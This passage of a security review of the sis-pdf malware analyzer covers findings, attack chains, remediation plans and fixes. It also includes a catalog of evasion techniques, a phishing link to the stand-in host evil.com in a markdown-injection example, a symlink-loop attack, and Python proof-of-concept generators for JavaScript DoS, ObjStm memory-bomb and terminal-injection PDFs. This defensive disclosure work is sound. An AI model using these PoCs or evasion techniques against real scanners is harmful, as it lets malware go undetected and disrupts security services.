{"intent": "legitimate-domain.com", "campaign_id": "false_positive_group"}
{"intent": "legitimate-domain.com", "campaign_id": "false_positive_group"}
{"intent": "legitimate-domain.com", "campaign_id": "false_positive_group"}
```

Creates appearance of campaign when there is none, causing analyst alert fatigue.

**3. Denial of correlation:**
```
[... 1 million entries of random intents ...]
```

Floods correlation with noise, hiding real attack patterns.

**4. Resource exhaustion:**
```
{"intent": "A".repeat(10_000_000)}  ← 10 MB string in single entry
```

Each JSON entry could be multi-MB, exhausting memory during parsing.

**Evidence:**
- JSONL parsing not shown in code excerpts, but command exists
- No input validation documented
- Assumes trusted JSONL source

**Weaponization Difficulty:** Low (if attacker controls JSONL input)

**Recommendations:**
1. **IMMEDIATE:** Validate JSONL input:
   - Max line length: 10 KB
   - Max file size: 100 MB
   - Max entries: 1 million
2. **IMMEDIATE:** Sanitize intent strings (max 1024 chars, printable ASCII only)
3. **SHORT-TERM:** Sign/verify JSONL files from trusted sources
4. **SHORT-TERM:** Add schema validation for expected fields
5. **DETECTION:** Alert on anomalous JSONL (too many entries, very long strings)

---

### MED-5: Markdown Report Injection

**Location:** Report generation (markdown output)

**Impact:** Malicious PDF metadata can inject Markdown/HTML into reports, potentially causing:
- Phishing links in reports
- Report rendering exploits (if converted to HTML)
- Misleading information for analysts

**Attack Payload:**

PDF with crafted metadata:
```
/Title (Legitimate Invoice [CLEAN])
/Author (**URGENT**: [Click here](http://evil.com/phish) to verify)
```

When rendered in markdown report:
```markdown
## Metadata
- Title: Legitimate Invoice [CLEAN]
- Author: **URGENT**: [Click here](http://evil.com/phish) to verify
```

Appears as bold text with clickable link in report viewer.

**Evidence:**
- Markdown report generation exists (Report command)
- Likely includes PDF metadata without sanitization
- Common pattern in report generation tools

**Weaponization Difficulty:** Low

**Recommendations:**
1. **IMMEDIATE:** Escape Markdown special characters in all external strings:
```rust
fn escape_markdown(s: &str) -> String {
    s.replace('\\', "\\\\")
     .replace('[', "\\[")
     .replace(']', "\\]")
     .replace('*', "\\*")
     // ... etc
}
```
2. **SHORT-TERM:** Use plain text reports by default, markdown as opt-in
3. **SHORT-TERM:** Add CSP headers if reports are served as HTML

---

## Low Severity Vulnerabilities

### LOW-1: WalkDir Symlink Attack

**Location:** `crates/sis-pdf/src/main.rs:556-569`

**Impact:** Batch scanning follows symlinks, allowing attacker to force scanning of system files or create infinite loops.

**Vulnerable Code:**
```rust
for entry in WalkDir::new(path) {  // ❌ Follows symlinks by default
    let entry = entry?;
    if !glob.is_match(entry.path()) {
        continue;
    }
    files.push(entry.path().to_path_buf());
}
```

**Attack:**
```bash
# Create symlink loop
mkdir scan_me
ln -s /usr/lib scan_me/lib
ln -s . scan_me/loop
```

WalkDir traverses infinitely or scans unintended files.

**Recommendations:**
1. **IMMEDIATE:** Disable symlink following:
```rust
WalkDir::new(path).follow_links(false)
```
2. **SHORT-TERM:** Add max depth limit (e.g., 10 levels)

---

### LOW-2: Verbose Error Messages Leak Implementation Details

**Location:** Various error returns

**Impact:** Detailed error messages could leak information about analyzer internals to attackers.

Example error:
```
Error: Object stream expansion failed at offset 0x12345 in buffer index 42
```

Leaks: Internal buffer structure, parsing offsets, implementation details.

**Recommendations:**
1. **SHORT-TERM:** Use generic error messages in production mode
2. **SHORT-TERM:** Add `--debug` flag for detailed errors (off by default)

---

### LOW-3: Predictor Algorithm Complexity Attack

**Location:** `crates/sis-pdf-pdf/src/decode.rs:161-216`

**Impact:** PNG predictor with filter type 4 (Paeth) has high computational complexity. Attacker can craft streams with maximum complexity.

**Attack:**
```
Create stream:
- Predictor: PNG Paeth (most expensive)
- Width: 10,000 pixels
- Height: 10,000 pixels
- Compressed size: 100 KB
- Decompressed: 100 MB

Result: O(n) iterations × O(1) Paeth computation = slow decode
```

**Recommendations:**
1. **SHORT-TERM:** Add timeout to decode operations (e.g., 30 seconds max)
2. **SHORT-TERM:** Limit predictor row/column counts

---

## Attack Chaining Scenarios

Sophisticated attackers will chain multiple vulnerabilities:

### Chain 1: Evasion + DoS

```
1. Craft PDF with parser differential (HIGH-1)
   → sis-pdf sees benign content
2. Add expensive JavaScript (CRIT-1)
   → Analyzer spends 60 seconds on benign-looking PDF
3. Submit 1000 copies via batch
   → DoS for 16 hours
4. During DoS window, submit ACTUAL malware
   → Malware queued but never analyzed
```

### Chain 2: Cache Poisoning + Evasion

```
1. Attacker gains access to shared cache directory (MED-1)
2. Crafts benign PDF, extracts hash
3. Creates malicious PDF with parser differential (HIGH-1)
4. Pre-populates cache with benign report for malicious PDF's hash
5. Victim scans malicious PDF
6. Cache returns benign report
7. Malware deployed without detection
```

### Chain 3: Resource Exhaustion Cascade

```
1. PDF with 100 ObjStms (CRIT-2)
   Each ObjStm: 1 MB → 32 MB
2. Parallel mode enabled (MED-3)
   10 detectors × 10 streams = 100 concurrent decodes
3. Each detector triggers JavaScript sandbox (CRIT-1)
   10 JS engines × 100k iterations × complex math
4. Total resource usage:
   - Memory: 3.2 GB (ObjStms) + 1 GB (parallel) = 4.2 GB
   - CPU: 10 cores × 60 seconds = 10 minutes wall time
5. Single PDF occupies entire analysis cluster
```

---

## Evasion Techniques Catalog

### Structural Evasion

1. **Max object boundary**: Exactly `max_objects` malicious objects + 1 trigger object
2. **ObjStm hiding**: Embed malicious objects in ObjStm streams (requires `--deep`)
3. **Linearized obfuscation**: Use linearized PDF format (uncommon in malware)
4. **Multiple trailers**: Include multiple xref/trailer sections with conflicting info
5. **Broken xref**: Force xref recovery path (different from standard parse)

### Content Evasion

1. **Parser differential**: Exploit sis-pdf vs victim reader differences
2. **Escape sequence tricks**: Invalid escapes that parse differently
3. **Encoding layers**: Multiple Filter layers (e.g., ASCII85 → Flate → LZW)
4. **Polyglot files**: PDF + ZIP + HTML in one file
5. **Malformed but functional**: Technically invalid but Adobe Reader accepts

### Resource Evasion

1. **Slow rollout**: Each object just below resource thresholds
2. **Time-of-check-time-of-use**: Race conditions in parallel mode
3. **Compression ratio gaming**: Craft streams with exact ratio to bypass limits
4. **Fragmentation**: Split payload across many small objects to avoid single-object detection

### Detection Evasion

1. **JavaScript obfuscation**: Polymorphic JS that bypasses signature detection
2. **Action chain complexity**: Multi-stage actions that require deep analysis
3. **Embedded file masking**: Malicious EXE with benign magic bytes
4. **Font exploitation**: Malformed fonts that trigger renderer bugs (not detected by static analysis)

---

## Fuzzing Recommendations

Current fuzz targets exist but should be enhanced:

### High-Priority Fuzz Campaigns

1. **ObjStm expansion fuzzing**
   - Target: `objstm.rs:expand_objstm`
   - Input: PDFs with nested, recursive, and malformed ObjStms
   - Monitor: Memory usage, execution time, panic/crash
   - Coverage: All branches in header parsing and object extraction

2. **Integer overflow fuzzing**
   - Target: All arithmetic in `decode.rs` predictor functions
   - Input: Extreme values (u32::MAX, 0, 1)
   - Monitor: Overflow panics, incorrect allocations
   - Coverage: All multiply/add/subtract operations

3. **Parser differential fuzzing**
   - Target: Compare sis-pdf vs lopdf vs Adobe Reader
   - Input: Malformed PDFs from existing CVE corpus
   - Monitor: Divergent parsing results
   - Coverage: All error recovery paths

4. **JS sandbox fuzzing**
   - Target: `js_sandbox.rs:run`
   - Input: Obfuscated, deeply nested, complex JS
   - Monitor: Execution time, memory, unexpected eval results
   - Coverage: All boa_engine code paths

5. **Parallel execution fuzzing**
   - Target: `runner.rs:run_scan_with_detectors` in parallel mode
   - Input: PDFs designed to trigger race conditions
   - Monitor: Memory spikes, data races (use TSAN)
   - Coverage: All parallel detector paths

### Corpus Development

Build corpus including:
- PDF-specific CVE samples (CVE-2010-0188, CVE-2013-2729, etc.)
- Malformed PDFs from GH security advisories
- Parser differential samples from academic papers
- Real-world malware PDFs (from VirusTotal, MalwareBazaar)
- Synthetic evasion samples from this review's attack vectors

---

## Monitoring and Detection

### Runtime Monitoring

Deploy these metrics in production:

```
Analysis Time Metrics:
- p50, p95, p99 analysis duration
- Alert: >10 seconds for any PDF
- Kill: >60 seconds wall time

Memory Metrics:
- Peak RSS per analysis
- Alert: >1 GB per file
- Kill: >4 GB per file

Object Metrics:
- Object count per PDF
- ObjStm count per PDF
- Alert: >100 ObjStms or >100k objects

Deviation Metrics:
- Count of parser deviations per PDF
- Alert: >50 deviations (likely evasion attempt)
- Escalate: Deviations in JS/Action objects

Resource Limit Hits:
- Track when limits enforced
- Alert: Same PDF hits limits repeatedly (tuning attack)

Cache Metrics:
- Cache hit rate
- Cache poisoning indicators (hash mismatch)
- Alert: Anomalous cache access patterns
```

### Logging for Forensics

Log these events:
- File hash (SHA256)
- Analysis start/end timestamp
- Resource usage (CPU seconds, peak memory)
- Deviations encountered (type, count, locations)
- Limits triggered (which limits, when)
- Detectors run (IDs, durations)
- Findings summary (high/medium/low counts)

Enable correlation of attacks across time.

---

## Defense in Depth Recommendations

### Immediate (Week 1)

1. ✅ Add wall-clock timeout to JS sandbox (5 second max) — implemented (best-effort timeout with threaded execution).
2. ✅ Pre-check resource budgets before expensive operations — implemented (ObjStm pre-check + global decoded budget reservation).
3. ✅ Validate file size before mmap (max 500 MB) — implemented (warn at 50 MB, hard fail at 500 MB).
4. ✅ Escape ALL external strings in terminal/report output — implemented (terminal + markdown escaping).
5. ✅ Disable symlink following in WalkDir — implemented (follow_links(false) + depth cap).
6. ✅ Add file size limits to config/cache loading — implemented (config size cap, cache entry size checks).
7. ✅ Validate YAML config value ranges — implemented (range checks + boundary logs).

### Short-Term (Month 1)

1. ⏳ Move JS sandbox to isolated subprocess with kill timeout
2. ⏳ Implement streaming ObjStm parser (don't hold all in memory)
3. ✅ Add checked arithmetic with overflow detection — implemented (checked predictor arithmetic + limits).
4. ✅ Enable `--diff-parser` by default for high-security mode — implemented for strict mode.
5. ⏳ Build parser differential test corpus
6. ✅ Add global memory budget for parallel execution — implemented (global decode budget + thread cap).
7. ✅ Implement cache integrity verification (hash check) — implemented (hash validation + match on load).
8. ✅ Add evasion detector (flags PDFs with many deviations) — implemented (deviation cluster + action-context escalation).

### Long-Term (Quarter 1)

1. ⏳ Eliminate unsafe code in ObjStm (use safe alternatives)
2. ⏳ Build comprehensive fuzz test suite (5 campaigns above)
3. ⏳ Add OS-level sandboxing (seccomp, pledge, containers)
4. ⏳ Implement resource limits enforcement via cgroups
5. ⏳ Add telemetry and anomaly detection
6. ⏳ Regular security audits (quarterly)
7. ⏳ Participate in PDF security research community
8. ⏳ Publish security.txt and responsible disclosure policy

---

## Testing Recommendations

### Security Test Suite

Build regression tests for all findings:

```rust
#[test]
fn test_crit1_js_sandbox_timeout() {
    let pdf = craft_pdf_with_js(r#"
        for (var i = 0; i < 100000; i++) {
            Math.pow(2, 1000);
        }
    "#);

    let start = Instant::now();
    let result = scan_pdf(&pdf);
    let duration = start.elapsed();

    assert!(duration < Duration::from_secs(10), "JS sandbox timeout failed");
}

#[test]
fn test_crit2_objstm_memory_limit() {
    let pdf = craft_pdf_with_n_objstms(100, 32 * 1024 * 1024);

    let result = scan_pdf(&pdf);

    // Should error before allocating 3.2 GB
    assert!(result.is_err());
    assert!(result.unwrap_err().to_string().contains("budget"));
}

#[test]
fn test_high1_parser_differential() {
    let pdf = craft_pdf_with_invalid_escape("\\x");

    let sis_result = sis_pdf_parse(&pdf);
    let lopdf_result = lopdf_parse(&pdf);

    if sis_result != lopdf_result {
        // Should flag as evasion attempt
        assert!(sis_result.findings.iter().any(|f| f.kind == "parser_differential"));
    }
}

// ... tests for all findings
```

### Adversarial Testing

1. **Red team exercise**: Hire external security firm to craft evasion PDFs
2. **Bug bounty**: Public bounty for DoS, evasion, or sandbox escape
3. **CTF challenge**: Create "exploit this PDF analyzer" CTF

---

## Threat Intelligence Integration

### Indicators to Track

1. **Structural IOCs:**
   - PDFs with >50 ObjStms
   - PDFs with >10k objects
   - PDFs with >50 parser deviations
   - PDFs approaching resource limits

2. **Behavioral IOCs:**
   - JavaScript execution >1 second
   - Files causing repeated crashes/timeouts
   - Files with terminal escape sequences
   - Files triggering differential parser results

3. **Campaign IOCs:**
   - Multiple files with identical structure but different payloads
   - Files with same embedded filename
   - Files with coordinated JSONL correlation entries

### Integration Points

- Feed structural IOCs to YARA rule generation
- Share behavioral IOCs with threat intel platforms (MISP)
- Publish evasion TTPs to ATT&CK framework
- Contribute malicious samples to VirusTotal, MalwareBazaar

---

## Conclusion

sis-pdf is a well-architected PDF malware analysis tool with strong Rust safety foundations. However, when viewed through an offensive security lens targeting this specific analyzer, multiple exploitation paths exist:

**Critical risks** center on **resource exhaustion** (CRIT-1, CRIT-2, CRIT-3) and **memory safety** (CRIT-4). A sophisticated attacker can craft PDFs that:
- Deny service for minutes to hours per file
- Exhaust gigabytes of memory before limits enforce
- Potentially trigger undefined behavior via unsafe code paths

**High risks** involve **detection evasion** (HIGH-1, HIGH-2) through parser differentials and tolerance mechanisms. Malware can hide in plain sight by exploiting divergence between sis-pdf and victim PDF readers.

**Medium risks** around **cache poisoning** (MED-1), **configuration injection** (MED-2), and **parallel execution** (MED-3) primarily affect shared/multi-tenant deployments.

**Immediate actions** should focus on:
1. JS sandbox wall-clock timeout (prevents targeted DoS)
2. Pre-check resource budgets (prevents memory exhaustion)
3. File size validation (basic input hygiene)
4. Output sanitization (prevents terminal injection)

**Strategic direction** should emphasize:
1. Defense in depth (OS sandboxing, resource limits, monitoring)
2. Fuzzing and adversarial testing (continuous security validation)
3. Differential analysis (detect evasion attempts)
4. Telemetry and threat intelligence (learn from attacks)

The maintainers demonstrate security awareness (existing sec-review.md, fuzz targets, diff-parser feature). With focused remediation of the findings above, sis-pdf can achieve strong resilience against targeted exploitation while maintaining its malware analysis capabilities.

---

## Progress Update (2025-XX-XX)

Implemented in this pass:
- ObjStm expansion pre-checks, object count caps, recursive reference detection, and budget logging.
- ObjStm streaming parse refactor: decoded buffers are no longer retained; unsafe lifetime transmute removed; ObjStm objects now own raw slices via `Cow`.
- Checked arithmetic for predictor parameters with safe upper bounds.
- Parser caps for array/dict sizes and stream length overflow detection.
- Global decode budget reservation and parallel thread pool cap.
- JS sandbox wall-clock timeout (best-effort) with runtime call logging.
- Cache hash validation and size limits; config size/range validation.
- File size checks before mmap; batch size/count caps; symlink-safe traversal.
- Terminal + markdown output escaping; JSONL input validation.

Still pending (larger architectural work):
- JS sandbox subprocess isolation.
- Streaming ObjStm parsing and unsafe removal.
- OS-level sandboxing / cgroups enforcement.
- Fuzzing corpus and automation.

---

## Roadmap: Technical Implementation Plan (Architectural Changes)

### 1) JS Sandbox Subprocess Isolation
Goal: Hard wall-clock kill + memory isolation for JS execution.
Plan:
1. Create a small standalone binary (e.g., `sis-pdf-js-runner`) that accepts JS via stdin and returns JSON results (calls list, timing, error).
2. Use `std::process::Command` with OS-level timeout:
   - Parent spawns child, writes payload, waits with timeout.
   - On timeout, kill process and mark finding.
3. Add resource limits:
   - Linux: `setrlimit` (CPU, RSS, stack), optionally `prlimit` or cgroups.
4. Wire into detector:
   - Replace in-process Boa eval with subprocess calls.
   - Preserve existing metadata format for findings.
5. Regression tests:
   - Long-running JS sample must be killed within timeout.
   - Calls list returned for benign samples.

### 2) Streaming ObjStm Parser + Unsafe Removal
Goal: Avoid holding full decoded ObjStm buffers and eliminate unsafe lifetime transmute.
Plan:
1. Refactor ObjStm expansion to parse headers into offsets without retaining full buffers.
2. Decode stream into a bounded buffer or iterator; parse objects sequentially.
3. Replace `Vec<Vec<u8>>` storage with owned buffer slots or index-based references.
4. Remove `transmute` by storing offsets + buffer indices in an owned structure.
5. Add regression tests:
   - Nested ObjStm references should be rejected.
   - Budget enforcement before decode should prevent expansion bombs.

### 3) OS-level Sandboxing + cgroups
Goal: Enforce hard resource limits for whole analysis.
Plan:
1. Introduce a worker runner that executes scans inside a constrained environment.
2. Linux: create cgroup per analysis with max memory + CPU quota.
3. Seccomp profile:
   - Allow minimal syscalls (read, mmap, write, exit, etc.).
4. Integrate with CLI:
   - Optional `--sandbox` flag and config presets.
5. Monitoring:
   - Emit logs on cgroup limit hits.

### 4) Fuzzing Infrastructure + Corpus
Goal: Continuous coverage for critical parsers and limits.
Plan:
1. Add fuzz targets for objstm, decode predictors, parser differentials.
2. Curate corpus from known PDFs and synthetic generators.
3. CI integration:
   - Nightly fuzz runs with crash triage.
4. Add regression tests for fixed issues.

### 5) Cache Integrity (MAC/Signature)
Goal: Prevent tampering in shared caches.
Plan:
1. Add optional HMAC key in config; store MAC in cache entries.
2. Verify MAC on load; reject on mismatch.
3. Document key rotation and cache invalidation strategy.

## Appendix: Exploitation Proof-of-Concepts

### PoC 1: JavaScript DoS

```python
#!/usr/bin/env python3
"""Generate PDF with CPU-exhausting JavaScript"""

def generate_js_dos_pdf():
    js_payload = """
    // Legal JS but extremely expensive
    var result = 0;
    for (var i = 0; i < 100000; i++) {
        var temp = Math.pow(2, 500) * Math.sqrt(999999);
        result += temp.toString().length;
    }
    app.alert("Done: " + result);
    """

    pdf = f"""
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [4 0 R] /Count 1 >>
endobj
3 0 obj
<< /S /JavaScript /JS ({js_payload}) >>
endobj
4 0 obj
<< /Type /Page /Parent 2 0 R >>
endobj
xref
0 5
0000000000 65535 f
0000000009 00000 n
0000000081 00000 n
0000000138 00000 n
0000000{len(js_payload)+200:06d} 00000 n
trailer
<< /Size 5 /Root 1 0 R >>
startxref
{len(js_payload)+250}
%%EOF
"""
    return pdf

with open("js_dos.pdf", "wb") as f:
    f.write(generate_js_dos_pdf().encode())

print("Generated js_dos.pdf - will take 30+ seconds to analyze")
```

### PoC 2: ObjStm Memory Bomb

```python
#!/usr/bin/env python3
"""Generate PDF with 100 ObjStms, each expanding to 32 MB"""

import zlib

def generate_objstm_bomb():
    objects = []

    # Create 100 ObjStms
    for i in range(100):
        # Create 32 MB of object data
        obj_data = "1 0 2 100 3 200 "  # Header: 3 objects at offsets 0, 100, 200
        obj_data += "<< /Type /Font >> " * 100000  # 32 MB of dict entries

        compressed = zlib.compress(obj_data.encode())

        obj = f"""
{i+10} 0 obj
<< /Type /ObjStm /N 3 /First 18 /Length {len(compressed)} /Filter /FlateDecode >>
stream
{compressed.decode('latin1')}
endstream
endobj
"""
        objects.append(obj)

    pdf = f"""%PDF-1.5
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [] /Count 0 >>
endobj
{''.join(objects)}
xref
0 {len(objects)+3}
{"".join(f"0000000000 65535 f\n" for _ in range(len(objects)+3))}
trailer
<< /Size {len(objects)+3} /Root 1 0 R >>
startxref
0
%%EOF
"""
    return pdf

with open("objstm_bomb.pdf", "wb") as f:
    f.write(generate_objstm_bomb().encode('latin1'))

print("Generated objstm_bomb.pdf - will exhaust 3.2 GB memory")
```

### PoC 3: Terminal Injection

```python
#!/usr/bin/env python3
"""Generate PDF with terminal escape sequences in metadata"""

def generate_terminal_injection_pdf():
    # ANSI escape: clear screen, move cursor, change color
    evil_title = "\\033[2J\\033[H\\033[32mCLEAN FILE - NO THREATS\\033[0m"

    pdf = f"""
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /Metadata 3 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [] /Count 0 >>
endobj
3 0 obj
<< /Title ({evil_title}) /Author (Legitimate User) >>
endobj
xref
0 4
0000000000 65535 f
0000000009 00000 n
0000000081 00000 n
0000000138 00000 n
trailer
<< /Size 4 /Root 1 0 R >>
startxref
250
%%EOF
"""
    return pdf

with open("terminal_injection.pdf", "wb") as f:
    f.write(generate_terminal_injection_pdf().encode())

print("Generated terminal_injection.pdf - will manipulate terminal output")
```

---

**Document Version:** 1.0
**Last Updated:** 2026-01-04
**Severity:** CRITICAL
**Recommended Action:** Immediate remediation of CRIT-level findings
